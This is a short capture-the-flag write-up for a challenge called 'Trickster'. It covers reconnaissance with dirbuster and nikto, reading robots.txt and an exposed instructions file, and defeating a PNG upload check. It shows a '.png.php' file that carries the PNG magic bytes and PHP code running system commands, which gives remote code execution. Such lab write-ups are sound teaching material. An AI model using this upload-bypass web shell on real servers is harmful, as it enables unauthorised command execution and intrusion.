# Trickster #

## Description ##

I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge
instance.

## Solution ##

Dirbuster finds

    Dir found: / - 200
    File found: /index.php - 200
    Dir found: /icons/ - 403
    Dir found: /uploads/ - 403
    File found: /uploads - 301
    Dir found: /icons/small/ - 403
    File found: /icons/small - 301
	
`nikto` finds

    + /robots.txt: Entry '/instructions.txt' is returned a
	non-forbidden or redirect HTTP code (200). See:
	https://portswigger.net/kb/issues/00600600_robots-txt-file 
    + /robots.txt: contains 2 entries which should be manually
      viewed. See:
      https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
	  
Check the `robots.txt`:

    User-agent: *
    Disallow: /instructions.txt
    Disallow: /uploads/
	
Get the `instructions.txt`

    Let's create a web app for PNG Images processing.
    It needs to:
    Allow users to upload PNG images
    	look for ".png" extension in the submitted files
    	make sure the magic bytes match (not sure what this is exactly but
    	wikipedia says that the first few bytes contain 'PNG' in
    	hexadecimal: "50 4E 47" )  
    after validation, store the uploaded files so that the admin can
    retrieve them later and do the necessary processing.

Construct a series of files with extension `.png.php` and contents
such as

``` php
PNG

<?php 
        phpinfo(); 
        system('ls ..');
?>
```

This gives a listing of the files in the webroot:

	HFQWKODGMIYTO.txt index.php instructions.txt robots.txt uploads 
	
The file HFQWKODGMIYTO.txt contains the flag.
